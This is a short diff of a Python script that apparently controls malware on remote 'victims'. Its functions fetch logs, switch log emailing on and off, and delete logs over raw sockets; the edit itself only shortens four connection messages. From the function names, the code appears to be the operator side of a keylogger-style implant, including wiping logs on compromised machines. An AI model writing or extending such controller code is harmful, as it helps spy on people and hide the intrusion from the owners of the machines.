@@ -126,7 +126,7 @@ def parse_cmd(victims, PORT):
 def get_log(target, PORT, intent):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        print("[*] Connecting to", target+':'+str(PORT))
+        print("[*] Connecting to", target)
         s.connect((target, PORT))
         print(s.recv(26).decode('utf-8'))
         s.send(intent.encode())
@@ -147,7 +147,7 @@ def get_log(target, PORT, intent):
 def mail_off(target, PORT, intent):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        print("[*] Connecting to", target+':'+str(PORT))
+        print("[*] Connecting to", target)
         s.connect((target, PORT))
         print(s.recv(26).decode('utf-8'))
         s.send(intent.encode())
@@ -160,7 +160,7 @@ def mail_off(target, PORT, intent):
 def mail_on(target, PORT, intent):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        print("[*] Connecting to", target+':'+str(PORT))
+        print("[*] Connecting to", target)
         s.connect((target, PORT))
         print(s.recv(26).decode('utf-8'))
         s.send(intent.encode())
@@ -173,7 +173,7 @@ def mail_on(target, PORT, intent):
 def rm_log(target, PORT, intent):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        print("[*] Connecting to", target+':'+str(PORT))
+        print("[*] Connecting to", target)
         s.connect((target, PORT))
         print(s.recv(26).decode('utf-8'))
         s.send(intent.encode())
